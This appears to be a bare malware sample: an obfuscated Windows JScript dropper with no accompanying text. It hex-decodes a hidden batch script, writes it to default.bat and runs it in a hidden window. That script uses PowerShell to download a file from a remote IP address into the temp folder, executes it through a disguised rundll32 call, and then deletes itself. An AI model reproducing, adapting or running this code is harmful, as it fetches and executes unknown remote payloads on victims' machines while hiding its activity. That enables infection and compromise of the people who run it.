

	function ayG9Vq0(aYugP1)
	{
		var aUVKyx = aYugP1.toString();
		var an1jdkIb = '';

		for(var aBN13h = 0; aBN13h < aUVKyx.length; aBN13h += 2)
		{
			an1jdkIb += String.fromCharCode(parseInt(aUVKyx.substr(aBN13h, 2), 16));
		}

		return(an1jdkIb);
	}

	var aYugP1 = '0d0a09406563686f206f66660d0a096563686f2068656c6c6f2c20776f726c642e2e2e2e0d0a09706f7765727368656c6c20697772202d75726920687474703a2f2f37372e39312e3132322e31332f3533362f3736323034372e646174202d6f202574656d70255c614e374a3877312e746d700d0a09527525313332202574656d70255c614e374a3877312e746d702c57696e640d0a09282064656c202f71202f662022257e663022203e6e756c20323e263120262065786974202f6220302020290d0a09';

	var a920lnS8 = new ActiveXObject('scripting.filesystemobject');
	var a4dPw = new ActiveXObject('wscript.shell');
	ajHL7Xl9 = a920lnS8.CreateTextFile('default.bat', true);
	ajHL7Xl9.WriteLine(ayG9Vq0(aYugP1));
	ajHL7Xl9.Close();

	a4dPw.run('default.bat nDLL', 0);

	